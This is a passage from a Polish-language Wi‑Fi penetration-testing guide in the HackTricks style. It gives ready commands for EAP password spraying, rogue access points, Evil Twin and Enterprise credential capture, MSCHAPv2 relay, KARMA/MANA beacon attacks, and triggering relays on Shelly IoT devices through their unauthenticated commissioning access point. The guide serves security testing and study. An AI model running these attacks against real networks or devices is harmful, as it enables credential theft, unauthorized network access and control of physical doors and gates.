- Zweryfikuj, czy klienci używają anonimowych zewnętrznych tożsamości (pseudonimy) dla EAP‑SIM/AKA zgodnie z wytycznymi 3GPP (np. 3GPP TS 33.402).
- Preferuj tunelowanie fazy tożsamości (np. EAP‑TTLS/PEAP przenoszący wewnętrzny EAP‑SIM/AKA), aby IMSI nigdy nie był wysyłany w postaci jawnej.
- Przechwycenia pakietów (association/auth) nie powinny ujawniać surowego IMSI w EAP-Response/Identity.

Powiązane: Eksploatacja sygnalizacji telekomunikacyjnej z użyciem przechwyconych identyfikatorów mobilnych
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Jeżeli od klienta oczekuje się użycia **username and password** (zauważ, że w tym przypadku **EAP-TLS won't be valid**), możesz spróbować pozyskać **listę** **usernames** (zobacz następny fragment) i **passwords** i spróbować **bruteforce** dostępu przy użyciu [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Ten atak można też przeprowadzić przy użyciu `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria ataków na klienta

### Wybór sieci i roaming

- Protokół 802.11 definiuje, w jaki sposób stacja dołącza do Extended Service Set (ESS), ale nie określa kryteriów wyboru ESS ani access point (AP) w jego obrębie.
- Stacje mogą w ramach roamingu przełączać się między AP udostępniającymi ten sam ESSID, utrzymując łączność w obrębie budynku lub obszaru.
- Protokół wymaga uwierzytelnienia stacji do ESS, ale nie nakłada obowiązku uwierzytelnienia AP wobec stacji.

### Preferred Network Lists (PNLs)

- Stacje przechowują ESSID każdej sieci bezprzewodowej, z którą się łączą, w Preferred Network List (PNL), wraz ze specyficznymi dla sieci ustawieniami konfiguracyjnymi.
- PNL jest wykorzystywana do automatycznego łączenia się ze znanymi sieciami, poprawiając wygodę użytkownika przez uproszczenie procesu łączenia.

### Passive Scanning

- AP okresowo nadają beacon frames, ogłaszając swoją obecność i funkcje, w tym ESSID AP, chyba że nadawanie jest wyłączone.
- Podczas passive scanning stacje nasłuchują beacon frames. Jeśli ESSID z beacon frame pasuje do wpisu w PNL stacji, stacja może automatycznie połączyć się z tym AP.
- Znajomość PNL urządzenia umożliwia potencjalne wykorzystanie przez podszycie się pod ESSID znanej sieci, oszukując urządzenie, by połączyło się z rogue AP.

### Active Probing

- Active probing polega na tym, że stacje wysyłają probe requests, aby wykryć pobliskie AP i ich cechy.
- Directed probe requests są kierowane do konkretnego ESSID, pomagając wykryć, czy dana sieć znajduje się w zasięgu, nawet jeśli jest ukryta.
- Broadcast probe requests mają pole SSID ustawione na null i są wysyłane do wszystkich pobliskich AP, pozwalając stacji sprawdzić, czy w zasięgu znajduje się któraś preferowana sieć, bez ujawniania zawartości PNL.

## Simple AP with redirection to Internet

Zanim wyjaśnimy, jak przeprowadzać bardziej złożone ataki, zostanie wyjaśnione **jak** po prostu **utworzyć** **AP** i **przekierować** jego **ruch** na interfejs podłączony **do** **Internetu**.

Używając `ifconfig -a` sprawdź, że interfejs wlan, na którym ma być utworzony AP, oraz interfejs podłączony do Internetu są obecne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utwórz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Następnie **set IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Następnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utwórz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj uciążliwe procesy**, ustaw **monitor mode** i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekazywanie i przekierowywanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Atak evil twin wykorzystuje sposób, w jaki klienci WiFi rozpoznają sieci, opierając się głównie na nazwie sieci (ESSID) bez konieczności uwierzytelnienia się base station (access point) wobec klienta. Kluczowe punkty:

- **Trudności w rozróżnieniu**: Urządzenia mają problemy z odróżnieniem legalnych i rogue access points, gdy dzielą ten sam ESSID i typ szyfrowania. W rzeczywistych sieciach często stosuje się wiele access points o tym samym ESSID, aby płynnie rozszerzyć zasięg.
- **Roaming klienta i manipulacja połączeniem**: Protokół 802.11 pozwala urządzeniom na roaming między access points w obrębie tego samego ESS. Atakujący mogą to wykorzystać, skłaniając urządzenie do rozłączenia się z aktualnym base station i połączenia z rogue. Można to osiągnąć poprzez zaoferowanie silniejszego sygnału lub zakłócenie połączenia z legalnym access point za pomocą metod takich jak deauthentication packets lub jamming.
- **Wyzwania w realizacji**: Skuteczne przeprowadzenie ataku evil twin w środowiskach z wieloma, dobrze rozmieszczonymi access points może być trudne. Deauthenticate pojedynczego legalnego access point często skutkuje połączeniem urządzenia z innym legalnym access point, chyba że atakujący potrafi deauthenticate wszystkie pobliskie access points lub strategicznie umieścić rogue access point.

Możesz stworzyć bardzo podstawowy Open Evil Twin (no capabilities to route traffic to Internet) robiąc:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Możesz również stworzyć Evil Twin za pomocą **eaphammer** (zauważ, że aby stworzyć evil twins za pomocą eaphammer interfejs **nie powinien być** w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Proszę zwrócić uwagę, że domyślnie, jeśli ESSID w PNL jest zapisany jako chroniony WPA, urządzenie nie połączy się automatycznie z Open evil Twin. Możesz spróbować przeprowadzić DoS na prawdziwym AP i mieć nadzieję, że użytkownik ręcznie połączy się z Twoim Open evil twin, albo możesz przeprowadzić DoS na prawdziwym AP i użyć WPA Evil Twin, aby przechwycić handshake (przy tej metodzie nie będziesz w stanie pozwolić ofierze połączyć się z Tobą, ponieważ nie znasz PSK, ale możesz przechwycić handshake i spróbować go crackować).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

Możesz stworzyć **Evil Twin using WPA/2** i jeśli urządzenia są skonfigurowane do łączenia się z tym SSID przy użyciu WPA/2, będą próbowały się połączyć. W każdym razie, aby zakończyć **4-way-handshake**, musisz również znać hasło, którego klient będzie używać. Jeśli go nie znasz, połączenie nie zostanie zakończone.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumieć ten atak, zalecam najpierw zapoznać się z krótkim [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Użycie hostapd-wpe**

`hostapd-wpe` potrzebuje pliku **konfiguracji** do działania. Aby **zautomatyzować** generowanie tych konfiguracji możesz użyć [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (pobierz plik python znajdujący się w _/etc/hostapd-wpe_ )
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym można wybrać wiele różnych elementów, takich jak ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Korzystanie z EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domyślnie EAPHammer wykorzystuje następujące metody uwierzytelniania (zauważ, że GTC jest pierwsza, używana do próby uzyskania plaintext passwords, a następnie stosowane są bardziej odporne metody uwierzytelniania):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Jest to domyślna metoda, aby uniknąć długich czasów łączenia. Możesz jednak również określić serwerowi metody uwierzytelniania od najsłabszych do najsilniejszych:
```
--negotiate weakest
```
Albo możesz też użyć:

- `--negotiate gtc-downgrade` aby użyć wysoce wydajnej implementacji GTC downgrade (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` aby ręcznie określić oferowane metody (oferowanie tych samych metod uwierzytelniania w tej samej kolejności co organizacja sprawi, że atak będzie dużo trudniejszy do wykrycia).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Gdy klienci pomijają weryfikację certyfikatu RADIUS (PEAP/TTLS)

- Jeśli urządzenia są skonfigurowane z „do not validate certificate”, sklonowany AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) zbierze **NetNTLMv2** (PEAP-MSCHAPv2) lub **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) jednocześnie ujawnia ukryte SSID podczas probe’ów i wymusza ponowne łączenia, chyba że PMF/802.11w blokuje sfałszowane deauth.
- Cracked NetNTLMv2 daje ponownie używalne Wi‑Fi/AD creds; GTC daje natychmiastowy plaintext.

#### Relaying PEAP-MSCHAPv2 zamiast łamania (wpa_sycophant + hostapd-mana)

- Dla kont maszynowych z niełamalnymi losowymi hasłami, nadużyj **MSCHAPv2 relay**: uruchom `hostapd-mana` jako Evil Twin, przekazując wymianę MSCHAPv2 do `wpa_sycophant`, który jednocześnie łączy się z legalnym AP. Udany relay przyznaje uwierzytelnione Wi‑Fi bez odzyskiwania hasła.
- Używaj buildów, które obsługują docelowy poziom zabezpieczeń (WPA3/PMF wymaga nowszego hostapd/wpa_supplicant); PMF zapobiega przymusowej deauth, więc poczekaj na dobrowolne skojarzenia klienta.

**Using Airgeddon**

`Airgeddon` może użyć wcześniej wygenerowanych certyfikatów, aby oferować uwierzytelnianie EAP do sieci WPA/WPA2-Enterprise. Fałszywa sieć zdegraduje protokół połączenia do EAP-MD5, dzięki czemu będzie w stanie **złapać użytkownika i MD5 hasła**. Później atakujący może spróbować złamać hasło.\
`Airggedon` oferuje możliwość **ciągłego ataku Evil Twin (noisy)** lub **utworzenia Evil Attack tylko do momentu, aż ktoś się połączy (smooth).**

![](<../../images/image (936).png>)

### Debugowanie tuneli TLS PEAP i EAP-TTLS w atakach Evil Twins

_To metoda przetestowana na połączeniu PEAP, ale ponieważ odszyfrowuję dowolny tunel TLS, powinno to działać także z EAP-TTLS_

W konfiguracji **hostapd-wpe** skomentuj linię zawierającą _**dh_file**_ (zmień z `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`)\
To spowoduje, że `hostapd-wpe` będzie **wymieniać klucze używając RSA** zamiast DH, dzięki czemu będziesz w stanie **odszyfrować** ruch później **znając prywatny klucz serwera**.

Teraz uruchom Evil Twin używając **`hostapd-wpe`** z tą zmodyfikowaną konfiguracją jak zwykle. Uruchom też **`wireshark`** na interfejsie, który przeprowadza atak Evil Twin.

Teraz lub później (kiedy już złapiesz kilka prób uwierzytelnienia) możesz dodać prywatny klucz RSA do wireshark w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypełnij formularz tymi wartościami: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wybierz swój plik klucza**, aby uniknąć problemów wybierz plik klucza **bez ochrony hasłem**).

![](<../../images/image (687).png>)

I spójrz na nową kartę **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## Atak KARMA, MANA, Loud MANA i Known beacons

### Białe i czarne listy ESSID i MAC

Różne typy Media Access Control Filter Lists (MFACLs) oraz ich odpowiadające tryby i wpływ na zachowanie rogue Access Pointa (AP):

1. **MAC-based Whitelist**:
- Rogue AP będzie odpowiadać tylko na probe requesty od urządzeń określonych na liście białej, pozostając niewidocznym dla wszystkich innych nieujętych na liście.
2. **MAC-based Blacklist**:
- Rogue AP będzie ignorować probe requesty od urządzeń znajdujących się na liście czarnej, skutecznie czyniąc rogue AP niewidocznym dla tych konkretnych urządzeń.
3. **SSID-based Whitelist**:
- Rogue AP będzie odpowiadać na probe requesty tylko dla określonych ESSID-ów wymienionych na liście białej, czyniąc go niewidocznym dla urządzeń, których Preferred Network Lists (PNLs) nie zawierają tych ESSID-ów.
4. **SSID-based Blacklist**:
- Rogue AP nie będzie odpowiadać na probe requesty dla konkretnych ESSID-ów będących na liście czarnej, czyniąc go niewidocznym dla urządzeń poszukujących tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **atakującemu na utworzenie złośliwego AP, który odpowiada na wszystkie probe requests** od urządzeń poszukujących połączenia z sieciami. Technika ta **oszukuje urządzenia, skłaniając je do połączenia się z AP atakującego** poprzez udawanie sieci, których urządzenia szukają. Gdy urządzenie wyśle żądanie połączenia do tego rogue AP, połączenie zostaje nawiązane, przez co urządzenie błędnie łączy się z siecią atakującego.

### MANA

Potem **urządzenia zaczęły ignorować niesolidne odpowiedzi sieciowe**, co zmniejszyło skuteczność oryginalnego karma attack. Jednak nowa metoda, znana jako **MANA attack**, została wprowadzona przez Ian de Villiers i Dominic White. Metoda ta polega na tym, że rogue AP **wychwytuje Preferred Network Lists (PNL) z urządzeń, odpowiadając na ich broadcast probe requests** nazwami sieci (SSID) wcześniej zapisanymi przez urządzenia. Ten wyrafinowany atak omija zabezpieczenia przeciwko oryginalnemu karma attack, wykorzystując sposób, w jaki urządzenia zapamiętują i priorytetyzują znane sieci.

Atak MANA działa poprzez monitorowanie zarówno directed, jak i broadcast probe requests od urządzeń. W przypadku directed requests zapisuje MAC address urządzenia i żądaną nazwę sieci, dodając te informacje do listy. Gdy nadejdzie broadcast request, AP odpowiada informacjami pasującymi do którejkolwiek z sieci na liście urządzenia, skłaniając urządzenie do połączenia z rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

**Loud MANA attack** to zaawansowana strategia stosowana, gdy urządzenia nie używają directed probing lub gdy ich Preferred Network Lists (PNL) są nieznane atakującemu. Opiera się na założeniu, że **urządzenia znajdujące się w tym samym obszarze prawdopodobnie będą miały wspólne nazwy sieci w swoich PNLs**. Zamiast odpowiadać selektywnie, atak ten rozgłasza probe responses dla każdej nazwy sieci (ESSID) znalezionej w połączonych PNLs wszystkich obserwowanych urządzeń. To szerokie podejście zwiększa szansę, że urządzenie rozpozna znaną sieć i spróbuje połączyć się z rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Kiedy **Loud MANA attack** może nie wystarczyć, **Known Beacon attack** oferuje inne podejście. Ta metoda **brute-forces proces łączenia przez symulowanie AP, który odpowiada na dowolną nazwę sieci, przechodząc przez listę potencjalnych ESSIDs** pochodzących z wordlist. Symuluje to obecność wielu sieci, mając nadzieję dopasować ESSID z PNL ofiary, co wywoła próbę połączenia z sfałszowanym AP. Atak można wzmocnić, łącząc go z opcją `--loud` dla bardziej agresywnej próby złapania urządzeń.

Eaphammer zaimplementował ten atak jako MANA attack, gdzie wszystkie ESSIDs z listy są nadawane (możesz też połączyć to z `--loud`, aby stworzyć Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Atak **Known Beacon Burst attack** polega na **szybkiej emisji beacon frames dla każdego ESSID wymienionego w pliku**. Tworzy to gęste środowisko fałszywych sieci, znacznie zwiększając prawdopodobieństwo, że urządzenia połączą się z rogue AP, szczególnie w połączeniu z MANA attack. Ta technika wykorzystuje prędkość i ilość, aby przeciążyć mechanizmy wyboru sieci w urządzeniach.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protokół umożliwiający urządzeniom bezpośrednie łączenie się ze sobą przy użyciu Wi‑Fi bez konieczności korzystania z tradycyjnego punktu dostępowego. Funkcja ta jest zintegrowana w różnych urządzeniach Internet of Things (IoT), takich jak drukarki i telewizory, ułatwiając bezpośrednią komunikację urządzenie‑z‑urządzeniem. Charakterystyczną cechą Wi‑Fi Direct jest to, że jedno urządzenie przejmuje rolę access pointa, znanego jako group owner, aby zarządzać połączeniem.

Bezpieczeństwo połączeń Wi‑Fi Direct oparte jest na **Wi‑Fi Protected Setup (WPS)**, które obsługuje kilka metod bezpiecznego parowania, w tym:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Te metody, szczególnie PIN entry, są podatne na te same słabości co WPS w tradycyjnych sieciach Wi‑Fi, co czyni je celami podobnych wektorów ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi‑Fi Direct. Odzwierciedla koncepcję ataku Evil Twin, ale celuje w połączenia Wi‑Fi Direct. W tym scenariuszu atakujący podszywa się pod legalnego group ownera, aby oszukać urządzenia i skłonić je do połączenia się z złośliwym bytem. Metodę tę można przeprowadzić za pomocą narzędzi takich jak `airbase-ng`, określając kanał, ESSID i adres MAC podrabianego urządzenia:

## Commissioning AP persistence & dual-homed IoT pivoting (Shelly Gen4 case)

Niektóre konsumenckie przekaźniki/kontrolery IoT utrzymują commissioning **open AP** aktywny po dołączeniu do IoT WLAN (np. SSIDy Shelly Gen4 zaczynające się od `Shelly`). Urządzenie pozostaje **dual-homed**: interfejs AP z domyślnym IP `192.168.33.1` oraz interfejs klienta w wewnętrznym WLAN.

**Abuse flow (Wi‑Fi proximity required):**

1. Połącz się z provisioning AP, uzyskaj dzierżawę DHCP i przeglądaj **AP-side HTTP API**.
2. Wywołaj przekaźniki przez nieautoryzowane endpointy, np. `http://192.168.33.1/relay/0?turn=on` (wpływ na drzwi/bramę/garaż). Endpointy do przesyłania firmware mogą dodać trwałość.
3. Wykorzystaj to jako **pivot**: skrypty Shelly mogą wysyłać HTTP z wewnętrznego interfejsu do innych hostów w LAN. Przykładowy pivot do innego Shelly pod `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Zamień URL na dowolny osiągalny wewnętrzny cel HTTP; dual‑homing eliminuje potrzebę dodatkowego routingu/NAT.
4. Na dużą skalę: wyszukaj SSIDy producenta na **wigle.net** (np. `Shelly`), aby zlokalizować commissioning AP do eksploatacji na miejscu.

Dla zachowania trwałości pozostaw commissioning AP włączony.

## References

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Sprawdź [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
